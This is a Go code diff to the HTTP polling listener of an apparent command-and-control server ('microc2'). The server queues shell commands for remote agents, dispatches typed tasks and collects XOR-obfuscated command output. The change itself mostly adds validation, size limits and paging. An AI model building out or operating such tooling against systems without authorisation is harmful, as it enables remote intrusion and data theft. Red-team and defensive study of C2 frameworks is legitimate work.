@@ -3,11 +3,13 @@ package behaviour
 
 import (
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"log"
 	"microc2/server/internal/common"
 	"microc2/server/internal/filestore"
+	"microc2/server/internal/tasks"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -18,13 +20,10 @@ import (
 )
 
 type HTTPPollingProtocol struct {
-	config   common.BaseProtocolConfig
-	mux      *http.ServeMux
-	commands struct {
-		sync.Mutex
-		queue map[string][]string // AgentID -> []command
-	}
-	results struct {
+	config    common.BaseProtocolConfig
+	mux       *http.ServeMux
+	taskStore *tasks.Store
+	results   struct {
 		sync.Mutex
 		history map[string][]CommandResult // AgentID -> []CommandResult
 	}
@@ -54,14 +53,14 @@ type Agent struct {
 // NewHTTPPollingProtocol creates a new HTTP polling protocol instance
 func NewHTTPPollingProtocol(config common.BaseProtocolConfig) *HTTPPollingProtocol {
 	p := &HTTPPollingProtocol{
-		config: config,
-		mux:    http.NewServeMux(),
+		config:    config,
+		mux:       http.NewServeMux(),
+		taskStore: tasks.NewStore(),
 		agents: struct {
 			sync.Mutex
 			list map[string]*Agent
 		}{list: make(map[string]*Agent)},
 	}
-	p.commands.queue = make(map[string][]string)
 	p.results.history = make(map[string][]CommandResult)
 	p.registerRoutes()
 	return p
@@ -90,50 +89,58 @@ func (p *HTTPPollingProtocol) GetHTTPHandler() http.Handler {
 func (p *HTTPPollingProtocol) handleAgentRequests(w http.ResponseWriter, r *http.Request) {
 	p.enableCors(w, r)
 
-	// log.Printf("[DEBUG] HandleAgentRequests called: %s %s", r.Method, r.URL.Path)
-
-	// Handle preflight OPTIONS requests
 	if r.Method == http.MethodOptions {
 		w.WriteHeader(http.StatusOK)
 		return
 	}
 
-	// Extract agent ID and action from path
-	// Expected format: /api/agent/{AgentID}/{action}
-	parts := strings.Split(r.URL.Path, "/")
-	if len(parts) < 5 {
-		log.Printf("[ERROR] Invalid request path: %s", r.URL.Path)
+	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
+	if len(parts) < 4 || parts[0] != "api" || parts[1] != "agent" {
 		http.Error(w, "Invalid request path", http.StatusBadRequest)
 		return
 	}
-
-	AgentID := parts[3]
-	action := parts[4]
-	if AgentID == "" || action == "" {
-		log.Printf("[ERROR] Invalid request path with empty agent ID or action")
-		http.Error(w, "Invalid request path", http.StatusBadRequest)
+	agentID := parts[2]
+	if err := tasks.ValidateIdentifier("agent_id", agentID); err != nil {
+		writeTaskError(w, err)
 		return
 	}
-
-	// log.Printf("[DEBUG] Handling %s request from agent %s", action, AgentID)
-
+	action := parts[3]
 	switch action {
 	case "heartbeat":
-		p.handleAgentHeartbeat(w, r, AgentID)
+		if len(parts) != 4 {
+			http.Error(w, "Invalid request path", http.StatusBadRequest)
+			return
+		}
+		p.handleAgentHeartbeat(w, r, agentID)
 	case "tasks":
-		p.handleAgentTasks(w, r, AgentID)
+		switch {
+		case len(parts) == 4:
+			p.handleAgentTasks(w, r, agentID)
+		case len(parts) == 6 && parts[5] == "status":
+			p.handleAgentTaskStatus(w, r, agentID, parts[4])
+		default:
+			http.Error(w, "Invalid task request path", http.StatusBadRequest)
+		}
 	case "results":
-		p.handleAgentResults(w, r, AgentID)
+		if len(parts) != 4 {
+			http.Error(w, "Invalid request path", http.StatusBadRequest)
+			return
+		}
+		p.handleTypedAgentResult(w, r, agentID)
 	case "command":
-		// Agent polling for next command
+		if len(parts) != 4 {
+			http.Error(w, "Invalid request path", http.StatusBadRequest)
+			return
+		}
 		p.handleGetCommand(w, r)
-		return
 	case "result":
-		// Agent submitting command result
-		p.handleAgentResults(w, r, AgentID)
-		return
+		if len(parts) != 4 {
+			http.Error(w, "Invalid request path", http.StatusBadRequest)
+			return
+		}
+		p.handleLegacyAgentResult(w, r, agentID)
 	default:
-		log.Printf("[ERROR] Unknown action %s from agent %s", action, AgentID)
+		log.Printf("[ERROR] Unknown action %s from agent %s", action, agentID)
 		http.Error(w, "Unknown action", http.StatusNotFound)
 	}
 }
@@ -186,65 +193,103 @@ func (p *HTTPPollingProtocol) handleAgentHeartbeat(w http.ResponseWriter, r *htt
 	w.Write(respBytes)
 }
 
-func (p *HTTPPollingProtocol) handleAgentTasks(w http.ResponseWriter, r *http.Request, AgentID string) {
+func (p *HTTPPollingProtocol) handleAgentTasks(w http.ResponseWriter, r *http.Request, agentID string) {
 	if r.Method != http.MethodGet {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
-	// log.Printf("[DEBUG] Agent %s requesting tasks", AgentID)
+	task, ok, err := p.taskStore.DispatchNext(agentID)
+	if err != nil {
+		writeTaskError(w, err)
+		return
+	}
+	if !ok {
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
 
-	// For now, return empty task list
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode([]interface{}{})
+	if err := json.NewEncoder(w).Encode(task); err != nil {
+		log.Printf("[ERROR] Failed to encode task %s for agent %s: %v", task.ID, agentID, err)
+	}
 }
 
-func (p *HTTPPollingProtocol) handleAgentResults(w http.ResponseWriter, r *http.Request, AgentID string) {
-	// log.Printf("[TRACE] Entered handleAgentResults for AgentID=%s, method=%s", AgentID, r.Method)
-
+func (p *HTTPPollingProtocol) handleAgentTaskStatus(w http.ResponseWriter, r *http.Request, agentID, taskID string) {
 	if r.Method != http.MethodPost {
-		log.Printf("[WARN] handleAgentResults: Invalid method %s for agent %s", r.Method, AgentID)
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if err := tasks.ValidateIdentifier("task_id", taskID); err != nil {
+		writeTaskError(w, err)
+		return
+	}
+
+	var update tasks.StatusUpdate
+	if err := decodeStrictJSON(w, r, &update, tasks.MaxStatusUpdateBodyBytes); err != nil {
+		writeJSONDecodeError(w, "Invalid task status update", err)
+		return
+	}
+	task, err := p.taskStore.MarkRunning(agentID, taskID, update)
+	if err != nil {
+		writeTaskError(w, err)
+		return
+	}
+	writeTaskJSON(w, http.StatusOK, task)
+}
+
+func (p *HTTPPollingProtocol) handleTypedAgentResult(w http.ResponseWriter, r *http.Request, agentID string) {
+	if r.Method != http.MethodPost {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
-	// Read and process results
-	body, err := io.ReadAll(r.Body)
-	if err != nil {
-		log.Printf("[ERROR] Failed to read results from agent %s: %v", AgentID, err)
-		http.Error(w, "Error reading request body", http.StatusBadRequest)
+	var result tasks.Result
+	if err := decodeStrictJSON(w, r, &result, tasks.MaxTaskResultBodyBytes); err != nil {
+		writeJSONDecodeError(w, "Invalid task result", err)
 		return
 	}
+	task, completion, err := p.taskStore.CompleteWithInfo(agentID, result)
+	if err != nil {
+		writeTaskError(w, err)
+		return
+	}
+	if completion.LegacyOrigin && completion.Applied {
+		p.recordLegacyResultForAgent(agentID, projectTypedTaskToLegacyResult(task))
+	}
+	writeTaskJSON(w, http.StatusOK, task)
+}
 
-	// log.Printf("[TRACE] handleAgentResults: Raw body from agent %s: %s", AgentID, string(body))
-
+func (p *HTTPPollingProtocol) handleLegacyAgentResult(w http.ResponseWriter, r *http.Request, agentID string) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
 	var result CommandResult
-	if err := json.Unmarshal(body, &result); err != nil {
-		log.Printf("[ERROR] Failed to unmarshal CommandResult from agent %s: %v", AgentID, err)
+	if err := decodeStrictJSON(w, r, &result, tasks.MaxLegacyResultBodyBytes); err != nil {
+		writeJSONDecodeError(w, "Invalid result format", err)
+		return
+	}
+	if strings.TrimSpace(result.Command) == "" {
 		http.Error(w, "Invalid result format", http.StatusBadRequest)
 		return
 	}
-	result.Timestamp = time.Now().Format(time.RFC3339)
+	result.Timestamp = time.Now().UTC().Format(time.RFC3339)
 
-	// Deobfuscate the output before logging or storing
-	deobfuscatedOutput, err := common.XORDeobfuscate(result.Output, AgentID)
+	deobfuscatedOutput, err := common.XORDeobfuscate(result.Output, agentID)
 	if err != nil {
-		log.Printf("[AGENT] Failed to deobfuscate result from %s for command '%s': %v. Storing raw output.", AgentID, result.Command, err)
-		// Store the raw output if deobfuscation fails, so it's not lost
+		log.Printf("[AGENT] Failed to deobfuscate legacy result from %s: %v. Storing raw output.", agentID, err)
 	} else {
 		result.Output = deobfuscatedOutput
 	}
 
-	log.Printf("[AGENT] Received result from %s for command '%s': %s", AgentID, result.Command, result.Output)
-
-	p.results.Lock()
-	p.results.history[AgentID] = append(p.results.history[AgentID], result)
-	// log.Printf("[TRACE] handleAgentResults: Results history length for agent %s after append: %d", AgentID, len(p.results.history[AgentID]))
-	p.results.Unlock()
-
-	// Acknowledge receipt
+	if _, matched, err := p.taskStore.CompleteLegacy(agentID, result.Command, result.Output); err != nil {
+		writeTaskError(w, err)
+		return
+	} else if matched {
+		p.recordLegacyResultForAgent(agentID, result)
+	}
 	w.WriteHeader(http.StatusOK)
-	// log.Printf("[TRACE] handleAgentResults: Sent HTTP 200 OK to agent %s", AgentID)
 }
 
 // Start implements the Protocol interface
@@ -287,7 +332,7 @@ func (p *HTTPPollingProtocol) HandleFileDownload(filename string) (io.Reader, er
 func (p *HTTPPollingProtocol) processAgentHeartbeat(agentData []byte, expectedAgentID string) error {
 	var agent Agent
 	if err := json.Unmarshal(agentData, &agent); err != nil {
-		log.Printf("[ERROR] Failed to unmarshal agent data: %v. Data: %s", err, string(agentData))
+		log.Printf("[ERROR] Failed to unmarshal agent heartbeat: %v", err)
 		return fmt.Errorf("failed to unmarshal agent data: %w", err)
 	}
 	if strings.TrimSpace(agent.ID) == "" {
@@ -390,29 +435,27 @@ func (p *HTTPPollingProtocol) handleQueueCommand(w http.ResponseWriter, r *http.
 
 func (p *HTTPPollingProtocol) handleGetCommand(w http.ResponseWriter, r *http.Request) {
 	p.enableCors(w, r)
-	// Extract AgentID from URL: /api/agent/{AgentID}/command
-	parts := strings.Split(r.URL.Path, "/")
-	if len(parts) < 5 {
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
+	if len(parts) != 4 {
 		http.Error(w, "Invalid request path", http.StatusBadRequest)
 		return
 	}
-	AgentID := parts[3]
-
-	p.commands.Lock()
-	defer p.commands.Unlock()
-	queue := p.commands.queue[AgentID]
-	// log.Printf("[DEBUG] handleGetCommand: AgentID=%s, queueLen=%d", AgentID, len(queue))
-	if len(queue) == 0 {
+	agentID := parts[2]
+	task, ok, err := p.taskStore.DispatchNextLegacy(agentID)
+	if err != nil {
+		writeTaskError(w, err)
+		return
+	}
+	if !ok {
 		w.WriteHeader(http.StatusNoContent)
 		return
 	}
-	cmd := queue[0]
-	p.commands.queue[AgentID] = queue[1:]
-	if len(queue) > 0 {
-		// log.Printf("[DEBUG] handleGetCommand: returning command to agent %s: %s", AgentID, cmd)
-	}
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"command": cmd})
+	json.NewEncoder(w).Encode(map[string]string{"command": task.Arguments.Command})
 }
 
 func (p *HTTPPollingProtocol) handleGetResults(w http.ResponseWriter, r *http.Request) {
@@ -528,12 +571,42 @@ func (p *HTTPPollingProtocol) GetAllAgents() map[string]interface{} {
 	return result
 }
 
-// QueueCommand queues a command for a specific agent
-func (p *HTTPPollingProtocol) QueueCommand(AgentID, cmd string) {
-	p.commands.Lock()
-	p.commands.queue[AgentID] = append(p.commands.queue[AgentID], cmd)
-	p.commands.Unlock()
-	log.Printf("[DEBUG] QueueCommand: AgentID=%s, cmd=%s, queueLen=%d", AgentID, cmd, len(p.commands.queue[AgentID]))
+func (p *HTTPPollingProtocol) AgentLastSeen(agentID string) (time.Time, bool) {
+	p.agents.Lock()
+	defer p.agents.Unlock()
+	agent, ok := p.agents.list[agentID]
+	if !ok || agent == nil {
+		return time.Time{}, false
+	}
+	return agent.LastSeen, true
+}
+
+// QueueCommand is the deprecated raw-command adapter. The command is recorded
+// as a typed shell task so both old and v1 agents share one lifecycle store.
+func (p *HTTPPollingProtocol) QueueCommand(agentID, command string) {
+	if _, err := p.taskStore.CreateLegacyShell(agentID, command); err != nil {
+		log.Printf("[WARN] Failed to queue legacy command for agent %s: %v", agentID, err)
+	}
+}
+
+func (p *HTTPPollingProtocol) QueueLegacyShellTask(agentID, command string) (tasks.Task, error) {
+	return p.taskStore.CreateLegacyShell(agentID, command)
+}
+
+func (p *HTTPPollingProtocol) CreateTask(agentID string, request tasks.CreateRequest) (tasks.Task, error) {
+	return p.taskStore.Create(agentID, request)
+}
+
+func (p *HTTPPollingProtocol) ListTasks(agentID string) ([]tasks.Task, error) {
+	return p.taskStore.List(agentID)
+}
+
+func (p *HTTPPollingProtocol) CancelTask(agentID, taskID string) (tasks.Task, error) {
+	return p.taskStore.Cancel(agentID, taskID)
+}
+
+func (p *HTTPPollingProtocol) GetTask(agentID, taskID string) (tasks.Task, error) {
+	return p.taskStore.Get(agentID, taskID)
 }
 
 // Exported method to get results history keys for debugging
@@ -560,8 +633,7 @@ func (p *HTTPPollingProtocol) GetResults(AgentID string) []map[string]interface{
 	history := p.results.history[AgentID]
 	// log.Printf("[DEBUG] Results history for AgentID=%s: %+v", AgentID, history)
 	var results []map[string]interface{}
-	for i, res := range history {
-		log.Printf("[DEBUG] Result %d for AgentID=%s: command=%s, output=%s, timestamp=%s", i, AgentID, res.Command, res.Output, res.Timestamp)
+	for _, res := range history {
 		results = append(results, map[string]interface{}{
 			"command":   res.Command,
 			"output":    res.Output,
@@ -570,4 +642,132 @@ func (p *HTTPPollingProtocol) GetResults(AgentID string) []map[string]interface{
 	}
 	// log.Printf("[DEBUG] Returning %d results for AgentID=%s", len(results), AgentID)
 	return results
+}
+
+// GetResultsPage returns a bounded slice of deprecated command results and the
+// total retained count. The slice is copied while holding the result lock, so
+// callers never need to materialize or race over the full listener history.
+func (p *HTTPPollingProtocol) GetResultsPage(
+	agentID string,
+	offset int,
+	limit int,
+) ([]map[string]interface{}, int) {
+	p.results.Lock()
+	defer p.results.Unlock()
+
+	history := p.results.history[agentID]
+	total := len(history)
+	if offset < 0 {
+		offset = 0
+	}
+	if offset > total {
+		offset = total
+	}
+	if limit < 0 {
+		limit = 0
+	}
+	available := total - offset
+	if limit > available {
+		limit = available
+	}
+	end := offset + limit
+	results := make([]map[string]interface{}, 0, limit)
+	for _, result := range history[offset:end] {
+		results = append(results, map[string]interface{}{
+			"command":   result.Command,
+			"output":    result.Output,
+			"timestamp": result.Timestamp,
+		})
+	}
+	return results, total
+}
+
+func (p *HTTPPollingProtocol) recordLegacyResultForAgent(agentID string, result CommandResult) {
+	p.results.Lock()
+	defer p.results.Unlock()
+	history := p.results.history[agentID]
+	if len(history) >= tasks.MaxTaskHistoryPerAgent {
+		history = append([]CommandResult(nil), history[len(history)-tasks.MaxTaskHistoryPerAgent+1:]...)
+	}
+	p.results.history[agentID] = append(history, result)
+}
+
+func projectTypedTaskToLegacyResult(task tasks.Task) CommandResult {
+	result := CommandResult{
+		Command: task.Arguments.Command,
+	}
+	if task.CompletedAt != nil {
+		result.Timestamp = task.CompletedAt.UTC().Format(time.RFC3339)
+	} else {
+		result.Timestamp = time.Now().UTC().Format(time.RFC3339)
+	}
+	if task.Result != nil {
+		result.Output = task.Result.Output.Stdout + task.Result.Output.Stderr
+		if task.Result.Outcome == tasks.OutcomeFailed && task.Result.Error != "" {
+			errorOutput := task.Result.Error
+			if !strings.HasPrefix(strings.TrimSpace(errorOutput), "Error:") {
+				errorOutput = "Error: " + errorOutput
+			}
+			if result.Output == "" {
+				result.Output = errorOutput
+			} else {
+				result.Output += "\n" + errorOutput
+			}
+		}
+	}
+	return result
+}
+
+func decodeStrictJSON(
+	w http.ResponseWriter,
+	r *http.Request,
+	destination interface{},
+	maxBytes int64,
+) error {
+	r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
+	decoder := json.NewDecoder(r.Body)
+	decoder.DisallowUnknownFields()
+	if err := decoder.Decode(destination); err != nil {
+		return err
+	}
+	var trailing interface{}
+	if err := decoder.Decode(&trailing); !errors.Is(err, io.EOF) {
+		if err == nil {
+			return fmt.Errorf("request body must contain exactly one JSON value")
+		}
+		return err
+	}
+	return nil
+}
+
+func writeJSONDecodeError(w http.ResponseWriter, message string, err error) {
+	var maxBytesError *http.MaxBytesError
+	if errors.As(err, &maxBytesError) {
+		http.Error(w, message+": request body too large", http.StatusRequestEntityTooLarge)
+		return
+	}
+	http.Error(w, message+": "+err.Error(), http.StatusBadRequest)
+}
+
+func writeTaskError(w http.ResponseWriter, err error) {
+	switch {
+	case tasks.IsValidationError(err):
+		http.Error(w, err.Error(), http.StatusBadRequest)
+	case errors.Is(err, tasks.ErrNotFound):
+		http.Error(w, err.Error(), http.StatusNotFound)
+	case errors.Is(err, tasks.ErrInvalidTransition):
+		http.Error(w, err.Error(), http.StatusConflict)
+	case errors.Is(err, tasks.ErrCapacity):
+		http.Error(w, err.Error(), http.StatusTooManyRequests)
+	default:
+		http.Error(w, "Task operation failed", http.StatusInternalServerError)
+	}
+}
+
+func writeTaskJSON(w http.ResponseWriter, status int, value interface{}) {
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(status)
+	if err := json.NewEncoder(w).Encode(value); err != nil {
+		log.Printf("[ERROR] Failed to encode task response: %v", err)
+	}
 }
